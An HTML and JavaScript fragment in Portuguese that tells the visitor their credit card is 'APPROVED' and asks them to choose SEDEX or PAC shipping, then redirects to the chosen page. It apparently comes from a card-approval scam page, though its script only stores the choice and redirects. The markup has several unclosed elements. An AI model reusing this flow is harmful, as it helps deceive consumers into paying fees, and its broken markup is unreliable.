    <div style="grid-area: content; padding: 0 1rem;">
        <div class="main-content">
            <h5 class="title">Agora basta escolher uma forma de envio do seu Cartão de Crédito <strong>APROVADO</strong></h5>
        
            <div id="opcoes-envio" class="shipping-options">
                <div class="card-opcao" onclick="selecionarOpcao('sedex')">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <h5 class="option-title">SEDEX</h5>

                        </div>

                <div class="card-opcao" onclick="selecionarOpcao('pac')">

                            <small class="option-subtitle">Chega em 5 dias úteis</small>

                        </div>
                    </div>

            </div>

            <button class="btn-custom" id="continuarEnvio" disabled>
                Continuar

    </div>

<script>
    let opcaoSelecionada = null;

    function selecionarOpcao(opcao) {
        opcaoSelecionada = opcao;

        document.querySelectorAll('.card-opcao').forEach(function(card) {
            card.classList.remove('selecionado');
        });

        document.querySelector(`.card-opcao[onclick="selecionarOpcao('${opcao}')"]`).classList.add('selecionado');
        document.getElementById('continuarEnvio').disabled = false;
    }

    document.getElementById('continuarEnvio').addEventListener('click', function() {
        if (opcaoSelecionada) {
            localStorage.setItem('freteEscolhido', opcaoSelecionada);
            if(opcaoSelecionada === 'sedex') {
                window.location.href = 'sedex/index.php.html'; 
            } else {
                window.location.href = 'pac/index.php.html';
            }
        }
    });
</script>
